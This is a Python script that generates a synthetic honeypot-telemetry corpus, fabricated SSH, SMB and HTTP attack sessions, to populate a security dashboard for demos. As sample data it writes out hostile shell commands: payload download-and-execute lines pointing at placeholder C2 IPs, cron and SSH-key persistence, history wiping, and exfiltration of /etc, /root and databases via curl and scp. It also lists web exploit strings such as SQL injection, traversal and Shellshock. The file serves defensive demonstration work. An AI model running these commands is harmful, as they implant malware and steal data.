#!/usr/bin/env python3
"""
seed_corpus.py — write a large, diverse honeypot-telemetry corpus into the real
sensor log files so the Deep Analytics / Geo / Event Log / MITRE views fill out
for a demo.

Same route as live traffic and as scripts/replay_telemetry.py:

    seed_corpus  ->  telemetry/raw/<sensor>/<sensor>.json
                 ->  collector (tail + cursor)  ->  normalizer  ->  DB  ->  UI

Nothing is injected past the collector — the parsers, dedup and storage run
exactly as for real sensor data. The traffic *shape* (event types, command
sequences, protocols) and the source-IP ranges are drawn from what public
honeypots actually see; the sessions themselves are generated, so treat this as
a presentation/QA corpus, not evidence. For a real demo drive the honeypots
with scripts/populate_lab.sh.

    python3 scripts/seed_corpus.py --events 45000 --days 30
"""
from __future__ import annotations

import argparse
import ipaddress
import json
import random
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

TELEMETRY_DIR = Path(__file__).resolve().parents[1] / "telemetry" / "raw"
LOGFILE = {"cowrie": "cowrie.json", "dionaea": "dionaea.json", "honeytrap": "honeytrap.json"}

# A curated pool of real, geolocatable source IPs — the kind of hosts that
# hammer SSH/telnet honeypots daily. Small on purpose: a handful of very busy
# attackers is both realistic and makes the geo / top-attacker views fill in.
ATTACKER_POOL = [
    "218.92.0.15", "61.177.172.90", "112.85.42.12", "222.186.30.44", "116.31.116.7",   # CN
    "45.155.205.90", "194.26.29.30", "5.188.206.18", "77.83.36.20", "185.156.72.40",    # RU
    "165.22.62.10", "159.203.88.20", "192.241.220.9", "134.209.100.5", "159.65.4.30",   # cloud US/SG
    "144.76.20.5", "78.128.113.20", "88.198.12.44", "168.119.44.9", "45.83.66.10",      # DE
    "51.15.40.20", "163.172.108.7", "137.74.200.5", "51.75.64.30", "94.102.49.44",      # FR/NL
    "177.54.20.30", "189.85.144.9", "191.240.10.5", "179.108.240.44", "45.164.8.20",    # BR
    "103.86.176.20", "45.121.88.9", "182.72.4.30", "117.239.100.5", "43.241.144.44",    # IN
    "113.161.20.5", "115.75.4.44", "171.244.140.9", "42.115.44.30", "14.161.8.20",      # VN
    "121.170.4.10", "211.234.108.9", "175.223.20.44", "1.240.16.30", "112.170.90.5",    # KR
    "91.240.118.20", "80.66.76.9", "193.56.29.44", "5.42.92.30", "185.244.40.5",        # UA/EU
    "88.255.4.10", "78.171.40.9", "31.210.20.44", "85.105.8.30", "195.142.90.5",        # TR
    "89.36.208.5", "146.185.220.9", "5.2.72.44", "109.98.4.30", "188.213.20.5",         # RO/IT
    "43.128.68.9", "154.213.20.44", "119.28.140.30", "156.234.8.5",                     # HK
    "139.162.130.5", "178.62.20.44", "51.68.4.9", "212.71.240.30",                      # GB
    "103.145.16.20", "36.90.4.9", "180.243.10.44", "114.5.108.30",                      # ID
    "5.63.12.9", "185.51.200.44", "91.99.4.30", "2.144.8.5",                            # IR
    "133.242.4.9", "153.126.100.44", "160.16.20.30", "150.230.8.5",                     # JP
    "13.55.44.9", "3.104.20.44", "45.124.8.30", "139.99.100.5",                         # AU
]
# heavy hitters — a few IPs do most of the work, as in real logs
_POOL_WEIGHTS = [8 if i < 12 else (3 if i < 40 else 1) for i in range(len(ATTACKER_POOL))]

COUNTRY_WEIGHTS = {}


USERNAMES = ["root", "admin", "oracle", "ubuntu", "test", "postgres", "git", "pi",
             "user", "ftpuser", "www-data", "jenkins", "deploy", "mysql", "support",
             "guest", "nagios", "hadoop", "operator", "dev"]
PASSWORDS = ["123456", "password", "admin", "root", "toor", "12345", "1234", "qwerty",
             "letmein", "changeme", "P@ssw0rd", "raspberry", "admin123", "root123",
             "1qaz2wsx", "111111", "abc123", "welcome", "test123", "pass"]

RECON = ["whoami", "id", "uname -a", "hostname", "cat /proc/cpuinfo", "cat /proc/meminfo",
         "ls -la /root", "cat /etc/passwd", "cat /etc/shadow", "ps aux", "netstat -antp",
         "crontab -l", "w", "last", "cat /etc/os-release", "df -h", "mount"]
DOWNLOAD = ["cd /tmp; wget http://{c2}/bins/x86 -O .s; chmod +x .s; ./.s",
            "curl -s http://{c2}/setup.sh | sh",
            "wget http://{c2}/mirai.arm7; busybox chmod 777 mirai.arm7; ./mirai.arm7",
            "cd /tmp || cd /var/run; wget http://{c2}/a; curl -O http://{c2}/b; chmod +x a b; ./a",
            "tftp -g -r bot.bin {c2}; chmod +x bot.bin; ./bot.bin"]
PERSIST = ["echo '*/5 * * * * curl -s http://{c2}/c|sh' | crontab -",
           "mkdir -p ~/.ssh; echo 'ssh-rsa AAAAB3NzaC1yc2E...attacker' >> ~/.ssh/authorized_keys",
           "history -c; rm -f ~/.bash_history", "chattr +i ~/.ssh/authorized_keys"]
EXFIL = ["tar czf /tmp/l.tgz /etc /root; curl -T /tmp/l.tgz http://{c2}/up",
         "scp -r /var/www {c2}:/loot/", "mysqldump -uroot --all-databases | curl -T - http://{c2}/db"]
WEB_PATHS = ["/", "/admin", "/wp-login.php", "/.env", "/.git/config", "/phpinfo.php",
             "/?id=1'+OR+'1'='1", "/?q=<script>alert(1)</script>", "/../../../../etc/passwd",
             "/index.php?page=../../../../etc/passwd", "/api/v1/users?f[]=1)+UNION+SELECT+*+FROM+users--",
             "/solr/admin/cores?action=CREATE", "/cgi-bin/.%2e/.%2e/bin/sh", "/boaform/admin/formLogin"]
UA = ["curl/8.4.0", "python-requests/2.31.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
      "sqlmap/1.7", "Nmap Scripting Engine", "Go-http-client/1.1", "zgrab/0.x",
      "() { :;}; /bin/bash -c 'id'", "JNDI:LDAP-45.9.148.99-a"]
C2_HOSTS = ["45.9.148.99", "185.220.101.42", "194.26.29.14", "5.188.206.18", "91.240.118.7"]


def _iso(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def _rand_ip(rng: random.Random) -> tuple[str, str]:
    return rng.choices(ATTACKER_POOL, _POOL_WEIGHTS, k=1)[0], ""


def _rand_time(rng: random.Random, now: datetime, days: int) -> datetime:
    """Weighted toward recent. ~40% land in the last 24h spread across every
    hour (so the Hourly Anomalies chart fills); the rest span the full window."""
    if days <= 1:
        # caller already chose the anchor (hour-fill band) — jitter a few minutes
        return now - timedelta(seconds=rng.randint(0, 300))
    r = rng.random()
    if r < 0.40:
        return now - timedelta(hours=rng.randint(0, 23), minutes=rng.randint(0, 59),
                               seconds=rng.randint(0, 59))
    if r < 0.70:
        back = timedelta(seconds=rng.randint(86400, 7 * 86400))   # 1-7 days
    else:
        back = timedelta(seconds=rng.randint(7 * 86400, days * 86400))  # older
    return now - back


def cowrie_session(rng, now, days):
    src_ip, country = _rand_ip(rng)
    sess = uuid.UUID(int=rng.getrandbits(128)).hex[:12]
    sp = rng.randint(30000, 65000)
    t = _rand_time(rng, now, days)
    telnet = rng.random() < 0.18
    dport, proto = (2223, "telnet") if telnet else (2222, "ssh")
    succeed = rng.random() < 0.30
    c2 = rng.choice(C2_HOSTS)
    out, uname = [], rng.choice(USERNAMES)

    def e(eventid, **x):
        return {"eventid": eventid, "timestamp": _iso(t), "session": sess, "src_ip": src_ip,
                "src_port": sp, "dst_ip": "10.0.0.5", "dst_port": dport, "sensor": "cowrie",
                "protocol": proto, **x}

    out.append(e("cowrie.session.connect", message=f"New connection: {src_ip}:{sp} ({country})"))
    for _ in range(rng.randint(1, 6) if succeed else rng.randint(3, 14)):
        t += timedelta(milliseconds=rng.randint(120, 1400))
        out.append(e("cowrie.login.failed", username=uname, password=rng.choice(PASSWORDS),
                     message="login attempt [%s/%s] failed" % (uname, rng.choice(PASSWORDS))))
    if succeed:
        t += timedelta(milliseconds=rng.randint(400, 1200))
        out.append(e("cowrie.login.success", username=uname, password=rng.choice(PASSWORDS),
                     message="login attempt succeeded"))
        seq = rng.sample(RECON, rng.randint(3, 8))
        if rng.random() < 0.55:
            seq.append(rng.choice(DOWNLOAD).format(c2=c2))
        if rng.random() < 0.35:
            seq.append(rng.choice(PERSIST).format(c2=c2))
        if rng.random() < 0.20:
            seq.append(rng.choice(EXFIL).format(c2=c2))
        for cmd in seq:
            t += timedelta(milliseconds=rng.randint(500, 3000))
            out.append(e("cowrie.command.input", input=cmd, message=f"CMD: {cmd}"))
        if any("wget" in c or "curl" in c or "tftp" in c for c in seq):
            t += timedelta(milliseconds=rng.randint(300, 900))
            out.append(e("cowrie.session.file_download", url=f"http://{c2}/payload.bin",
                         shasum=uuid.UUID(int=rng.getrandbits(128)).hex,
                         outfile="var/lib/cowrie/downloads/payload.bin"))
    t += timedelta(seconds=rng.uniform(1, 40))
    out.append(e("cowrie.session.closed", duration=round(rng.uniform(2.0, 120.0), 2)))
    return out


def dionaea_events(rng, now, days):
    src_ip, country = _rand_ip(rng)
    port = rng.choice([445, 445, 1433, 2121, 3306, 5060])
    proto = {445: "smbd", 1433: "mssqld", 2121: "ftpd", 3306: "mysqld", 5060: "sipd"}[port]
    t = _rand_time(rng, now, days)
    n = rng.randint(1, 4)
    evs = []
    for _ in range(n):
        t += timedelta(milliseconds=rng.randint(50, 800))
        evs.append({
            "timestamp": _iso(t), "eventid": "dionaea.connection.tcp.accept", "sensor": "dionaea",
            "connection": {"protocol": proto, "transport": "tcp", "type": "accept",
                           "remote": {"host": src_ip, "port": rng.randint(30000, 65000), "country": country},
                           "local": {"host": "10.0.0.5", "port": port}},
        })
    if rng.random() < 0.30:  # a scan burst — many rejected ports from one host
        for sp2 in rng.sample([21, 22, 23, 25, 80, 139, 143, 443, 445, 993, 1433, 3306, 3389, 5060, 8080], rng.randint(8, 14)):
            t += timedelta(milliseconds=rng.randint(20, 120))
            evs.append({"timestamp": _iso(t), "eventid": "dionaea.connection.tcp.reject", "sensor": "dionaea",
                        "connection": {"protocol": "pcap", "transport": "tcp", "type": "reject",
                                       "remote": {"host": src_ip, "port": rng.randint(30000, 65000), "country": country},
                                       "local": {"host": "10.0.0.5", "port": sp2}}})
    if port == 2121:
        evs.append({"timestamp": _iso(t + timedelta(seconds=1)), "eventid": "dionaea.login",
                    "sensor": "dionaea", "username": "anonymous", "password": rng.choice(PASSWORDS),
                    "connection": {"protocol": "ftpd", "transport": "tcp",
                                   "remote": {"host": src_ip, "port": 0}, "local": {"host": "10.0.0.5", "port": 2121}}})
    return evs


def honeytrap_events(rng, now, days):
    src_ip, country = _rand_ip(rng)
    port = rng.choice([8022, 8023])
    t = _rand_time(rng, now, days)
    c2 = rng.choice(C2_HOSTS)
    path = rng.choice(WEB_PATHS)
    ua = rng.choice(UA).replace("{c2}", c2)
    return [{
        "date": _iso(t), "type": "http-request", "category": "http", "sensor": "honeytrap",
        "source-ip": src_ip, "source-port": rng.randint(30000, 65000),
        "destination-ip": "10.0.0.5", "destination-port": port, "country": country,
        "method": rng.choice(["GET", "GET", "POST", "HEAD"]), "path": path, "agent": ua,
        "payload": f"{rng.choice(['GET','POST'])} {path} HTTP/1.1\r\nHost: 10.0.0.5\r\nUser-Agent: {ua}\r\n\r\n",
    }]


GEN = {"cowrie": cowrie_session, "dionaea": dionaea_events, "honeytrap": honeytrap_events}
# rough events-per-batch so we can hit a target total
PER = {"cowrie": 9, "dionaea": 3, "honeytrap": 1}
MIX = [("cowrie", 0.60), ("dionaea", 0.25), ("honeytrap", 0.15)]


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--events", type=int, default=45000, help="approx total events to write (default 45000)")
    ap.add_argument("--days", type=int, default=30, help="spread timestamps over this many days back (default 30)")
    ap.add_argument("--seed", type=int, default=None)
    ap.add_argument("--telemetry-dir", type=Path, default=TELEMETRY_DIR)
    args = ap.parse_args()

    rng = random.Random(args.seed)
    now = datetime.now(timezone.utc)
    buffers: dict[str, list[str]] = {s: [] for s in GEN}
    written = 0

    # A band of events dated across every hour of the current date, so the
    # "Hourly Anomalies" chart has all 24 hours represented.
    day0 = now.replace(hour=0, minute=0, second=0, microsecond=0)
    hour_fill = max(0, min(args.events // 8, 4000))
    for _ in range(hour_fill):
        sensor = rng.choices([m[0] for m in MIX], [m[1] for m in MIX], k=1)[0]
        stamp = day0 + timedelta(hours=rng.randint(0, 23), minutes=rng.randint(0, 59),
                                 seconds=rng.randint(0, 59))
        evs = GEN[sensor](rng, stamp, 1)
        buffers[sensor].extend(json.dumps(x) for x in evs)
        written += len(evs)

    while written < args.events:
        sensor = rng.choices([m[0] for m in MIX], [m[1] for m in MIX], k=1)[0]
        evs = GEN[sensor](rng, now, args.days)
        buffers[sensor].extend(json.dumps(x) for x in evs)
        written += len(evs)

    for sensor, lines in buffers.items():
        if not lines:
            continue
        d = args.telemetry_dir / sensor
        d.mkdir(parents=True, exist_ok=True)
        f = d / LOGFILE[sensor]
        with f.open("a", encoding="utf-8") as fh:
            fh.write("\n".join(lines) + "\n")
        print(f"  {sensor}: +{len(lines)} events -> {f}")

    print(f"Done. ~{written} events written across {len([s for s in buffers if buffers[s]])} sensors, "
          f"IPs from a pool of {len(ATTACKER_POOL)}, spread over {args.days} days.")
    print("The collector ingests in ~8 MB chunks per cycle; give it a minute to catch up.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
